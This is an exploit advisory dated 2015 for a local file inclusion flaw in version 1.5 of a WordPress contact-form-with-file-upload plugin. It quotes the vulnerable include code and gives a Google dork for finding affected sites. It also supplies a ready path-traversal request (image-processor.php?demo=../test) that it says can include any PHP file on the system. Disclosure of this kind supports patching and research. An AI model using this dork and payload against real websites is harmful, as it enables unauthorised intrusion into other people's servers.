# Exploit Title: website contact form with file upload 1.5 Exploit Local File Inclusion
# Google Dork: inurl:"/plugins//website-contact-form-with-file-upload/"
# Date: 07.05.2015
# Exploit Author: T3N38R15
# Software Link: https://wordpress.org/plugins/website-contact-form-with-file-upload/
# Version: 1.5
# Tested on: Windows/Linux
 
The affected file is /wp-content/plugins/website-contact-form-with-file-upload/lib/wide-image/image-processor.php
it include the file /wp-content/plugins/website-contact-form-with-file-upload/lib/wide-image/helpers/demo.php
and at the line 23-26 are the inclusion.
 
 
            $file = LIB_PATH . '/filters/' . $name . '.php';
            if (!file_exists($file))
                throw new Exception("Invalid demo: {$name}");
            include($file);
 
 
The exploit can be used like that : /wp-content/plugins/website-contact-form-with-file-upload/lib/wide-image/image-processor.php?demo=../test
This version would include the test.php file in the same directory because we need to back navigate from the directory ./filters/../test.php
Now we can include all php files on the system.
 
Proof of concept : http://localhost/wp-content/plugins/website-contact-form-with-file-upload/lib/wide-image/image-processor.php?demo=../test
